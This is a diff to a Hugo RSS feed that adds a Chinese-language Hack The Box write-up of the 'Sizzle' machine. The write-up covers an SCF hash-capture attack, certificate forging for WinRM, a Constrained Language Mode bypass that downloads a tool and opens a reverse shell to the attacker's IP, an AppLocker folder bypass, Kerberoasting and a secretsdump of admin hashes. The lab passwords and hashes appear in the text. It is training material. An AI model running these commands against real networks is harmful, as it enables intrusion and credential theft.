@@ -7,13 +7,362 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Example Person</copyright>
-        <lastBuildDate>Sat, 29 Mar 2025 05:38:03 +0000</lastBuildDate><atom:link href="https://nergigantes.github.io/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 31 Mar 2025 12:48:47 +0000</lastBuildDate><atom:link href="https://nergigantes.github.io/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Sizzle</title>
+        <link>https://nergigantes.github.io/htb/sizzle/</link>
+        <pubDate>Mon, 31 Mar 2025 20:24:47 +0800</pubDate>
+        
+        <guid>https://nergigantes.github.io/htb/sizzle/</guid>
+        <description>&lt;img src="https://nergigantes.github.io/19.jpg" alt="Featured image of post Sizzle" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d.png&#34;
+	width=&#34;1165&#34;
+	height=&#34;857&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d_hua53212d7a771bf6914723eedc334f6ed_411213_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d_hua53212d7a771bf6914723eedc334f6ed_411213_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;135&#34;
+		data-flex-basis=&#34;326px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;域名：HTB.LOCAL&lt;/p&gt;
+&lt;p&gt;smb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nxc smb 10.10.10.103 -u &amp;#39;guest&amp;#39; -p &amp;#39;&amp;#39; --shares
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b.png&#34;
+	width=&#34;1222&#34;
+	height=&#34;506&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b_hua5ba370b7f98ab263c8b448f224cc446_294219_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b_hua5ba370b7f98ab263c8b448f224cc446_294219_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;241&#34;
+		data-flex-basis=&#34;579px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;详细看看这俩个共享文件夹Department Shares IPC$&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;smbclient //10.10.10.103/&amp;#34;Department Shares&amp;#34; -U &amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;IPC$文件里没有东西，Department Shares文件夹里有，但是这样一看看不出什么东西来&lt;/p&gt;
+&lt;p&gt;看其他的大佬的wp后发现思路-寻找可写文件夹-发现有个user文件夹下会删除我们写的文件-&lt;/p&gt;
+&lt;p&gt;这个删除的行为相当于一次交互-利用这一点执行SCF 文件攻击&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;为了方便我们把smb共享目录挂载在本地上查看&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;mount -t cifs &amp;lt;共享路径&amp;gt; &amp;lt;挂载点&amp;gt; -o &amp;lt;选项&amp;gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);&#34;&gt;mount -t cifs -o rw,username=guest,password= &amp;lsquo;//10.10.10.103/Department Shares&amp;rsquo; /mnt&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;以读写模式挂载&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;查看能写的文件夹，这里不能用find命令去看，因为我们这个文件夹是挂载的，所以最好的办法就是写一个脚本一个一个文件夹创建文件来看看能不能写文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;list=$(find /mnt -type d)  # 查找 /mnt 及其子目录，返回目录列表
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;for d in $list              # 遍历每个目录
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;do
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    touch $d/x 2&amp;gt;/dev/null  # 尝试在该目录创建一个空文件 x，错误信息重定向到 /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    if [ $? -eq 0 ]         # 检查 touch 命令是否成功
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    then
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        echo $d &amp;#34; is writable&amp;#34;  # 输出可写目录
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    fi
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;done
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7.png&#34;
+	width=&#34;877&#34;
+	height=&#34;245&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7_hu9387f7eb6791f799ea5e6a56674c9bea_78903_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7_hu9387f7eb6791f799ea5e6a56674c9bea_78903_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;357&#34;
+		data-flex-basis=&#34;859px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们能够在俩个文件夹下写&lt;/p&gt;
+&lt;p&gt;在public文件夹中写入我们的scf攻击文件&lt;/p&gt;
+&lt;p&gt;然后用responder开启smb服务并监听&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo responder -I tun0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;等待一会&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553.png&#34;
+	width=&#34;1208&#34;
+	height=&#34;370&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553_hu83df304482769e2b1f6f696b8331d811_389083_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553_hu83df304482769e2b1f6f696b8331d811_389083_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;326&#34;
+		data-flex-basis=&#34;783px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到amanda用户的hash，爆破一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a.png&#34;
+	width=&#34;1204&#34;
+	height=&#34;252&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a_hu3ec23956479bf583af1594cb20b56505_124793_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a_hu3ec23956479bf583af1594cb20b56505_124793_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;477&#34;
+		data-flex-basis=&#34;1146px&#34;
+	
+&gt;Ashare1972，现在我们就有了一组账号密码了&lt;/p&gt;
+&lt;p&gt;但是这个用户登陆不了&lt;/p&gt;
+&lt;p&gt;这里要回到信息收集的时候，那个网站能爆出一个目录，我们可以用这个账号密码登陆&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458.png&#34;
+	width=&#34;1167&#34;
+	height=&#34;662&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458_hu2ac9338722e70e541acfb304099c9a14_176791_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458_hu2ac9338722e70e541acfb304099c9a14_176791_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;423px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40.png&#34;
+	width=&#34;2869&#34;
+	height=&#34;1207&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40_hu00bfa9535525f3a16a37e76e639ed303_347511_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40_hu00bfa9535525f3a16a37e76e639ed303_347511_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;237&#34;
+		data-flex-basis=&#34;570px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进来后发现这里是一个可以搓证书的地方&lt;/p&gt;
+&lt;p&gt;openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr&lt;/p&gt;
+&lt;p&gt;先搓一个amanda.csr出来，然后拿里面的码去生成我们需要的证书&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56.png&#34;
+	width=&#34;2592&#34;
+	height=&#34;955&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56_hu627a64cfdf3543b1810982c6b1dda835_180160_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56_hu627a64cfdf3543b1810982c6b1dda835_180160_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;271&#34;
+		data-flex-basis=&#34;651px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;最后使用证书和key登陆&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u &#39;amanda&#39; -p &#39;Ashare1972&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;上去之后上传SharpHound.exe分析一下情况，但是上传报错，那就使用Houndblood-python去扫一下&lt;/p&gt;
+&lt;p&gt;分析结果发现&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f.png&#34;
+	width=&#34;1275&#34;
+	height=&#34;992&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f_hu8fb3967cf61741b5d291641a77b4c9c8_134355_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f_hu8fb3967cf61741b5d291641a77b4c9c8_134355_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;128&#34;
+		data-flex-basis=&#34;308px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;mrlky用户有很大的利用价值，不仅是因为他拥有对域的DCSync权限，还因为该账户被设置了SPN&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796.png&#34;
+	width=&#34;732&#34;
+	height=&#34;699&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796_hu63ea10f2a6c95511f29643c7924f62b8_55883_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796_hu63ea10f2a6c95511f29643c7924f62b8_55883_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;104&#34;
+		data-flex-basis=&#34;251px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那么接下来，就进行Kerberoasting攻击&lt;/p&gt;
+&lt;p&gt;但是尝试了几次都不行，那就换一个Kerberoasting攻击方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20.png&#34;
+	width=&#34;1705&#34;
+	height=&#34;260&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20_hud34124d52620a1c104ce12031b53b1d6_98239_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20_hud34124d52620a1c104ce12031b53b1d6_98239_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;655&#34;
+		data-flex-basis=&#34;1573px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;了解到我们可以使用&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;Rubeus请求&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;但是我们目前无法上传文件，原因是现在是&lt;/font&gt;&lt;strong&gt;约束模式（Constrained Language Mode）&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;$ExecutionContext.SessionState.LanguageMode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa.png&#34;
+	width=&#34;1192&#34;
+	height=&#34;111&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa_hu79bcf0b9dd3da4e96067e043a8145563_22956_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa_hu79bcf0b9dd3da4e96067e043a8145563_22956_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1073&#34;
+		data-flex-basis=&#34;2577px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;因此现在我们该突破这个约束&lt;/p&gt;
+&lt;p&gt;选择利用PSByPassCLM&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);&#34;&gt;iwr -uri http://10.10.16.21:5001/PsBypassCLM.exe -outfile PsBypassCLM.exe&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);&#34;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.21 /rport=2333 C:\Users\amanda\Documents\PsBypassCLM.exe&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3.png&#34;
+	width=&#34;1705&#34;
+	height=&#34;918&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3_huc2ac997cf33c241ec0757dcb2d837a26_231122_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3_huc2ac997cf33c241ec0757dcb2d837a26_231122_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;445px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在我们就拥有了一个不被限制的shell了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92.png&#34;
+	width=&#34;1949&#34;
+	height=&#34;459&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92_hufcf223b559460976c0b0add2f852fbab_117993_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92_hufcf223b559460976c0b0add2f852fbab_117993_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;424&#34;
+		data-flex-basis=&#34;1019px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在将Rubeus文件上传,执行&lt;/p&gt;
+&lt;p&gt;.\rubeus.exe kerberoast /creduser:&lt;strong&gt;htb.local&lt;/strong&gt;*&lt;em&gt;amanda&lt;/em&gt;* /credpassword:&lt;strong&gt;Ashare1972&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;又有问题了，rubeus文件被系统ban了&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;AppLocker 或 Windows Defender Application Control（WDAC）&lt;/strong&gt; 阻止了 Rubeus。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;被 Windows Defender 或其他安全工具检测为恶意软件&lt;/strong&gt;（基于特征码或路径）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;现在该想如何绕过这个限制&lt;/p&gt;
+&lt;p&gt;经了解，可以将文件放置在这些文件夹的话，就可以执行&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae.png&#34;
+	width=&#34;1321&#34;
+	height=&#34;1034&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae_hu9eefd145a3edb123b5c1ae82799dc8ef_123750_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae_hu9eefd145a3edb123b5c1ae82799dc8ef_123750_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;127&#34;
+		data-flex-basis=&#34;306px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;经测试，可以在&lt;/p&gt;
+&lt;p&gt;C:\Windows\System32\spool\drivers\color目录下绕过策略组执行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496.png&#34;
+	width=&#34;1561&#34;
+	height=&#34;1010&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496_hued1aeef4fc17cf36f84c28e151902b0c_289586_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496_hued1aeef4fc17cf36f84c28e151902b0c_289586_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;370px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到mrlky用户的hash，上爆破！！&lt;/p&gt;
+&lt;p&gt;结果一直爆破不出来。。后来重新运行了一下结果能爆破出来了？而且俩次的hash值也不同&lt;/p&gt;
+&lt;p&gt;所以，这是为啥呢。。。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f.png&#34;
+	width=&#34;1977&#34;
+	height=&#34;685&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f_hu46b98b484e0d3396bca9a8ff39a85661_488879_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f_hu46b98b484e0d3396bca9a8ff39a85661_488879_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;288&#34;
+		data-flex-basis=&#34;692px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不管怎么说，我们现在有了mrlky的账户&lt;/p&gt;
+&lt;p&gt;Football#7&lt;/p&gt;
+&lt;p&gt;是时候向着最后一步发起冲击了！&lt;/p&gt;
+&lt;p&gt;虽然evil登不了（应该是像amanda一样需要搓证书），但是我们已经拥有了mrlky账户密码，直接secretsdump倾倒出hash密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149.png&#34;
+	width=&#34;1267&#34;
+	height=&#34;519&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149_hu9aa79cf9eb30f09e732cb0bb2f636a7c_201970_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149_hu9aa79cf9eb30f09e732cb0bb2f636a7c_201970_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;244&#34;
+		data-flex-basis=&#34;585px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267&lt;/p&gt;
+&lt;p&gt;同样的administratot估计也登不了evil-winrm，但是我们还有其他交互shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31.png&#34;
+	width=&#34;1415&#34;
+	height=&#34;299&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31_hu46bfa70c214dc5c246942b0859a0f689_151427_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31_hu46bfa70c214dc5c246942b0859a0f689_151427_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;473&#34;
+		data-flex-basis=&#34;1135px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到shell&lt;/p&gt;
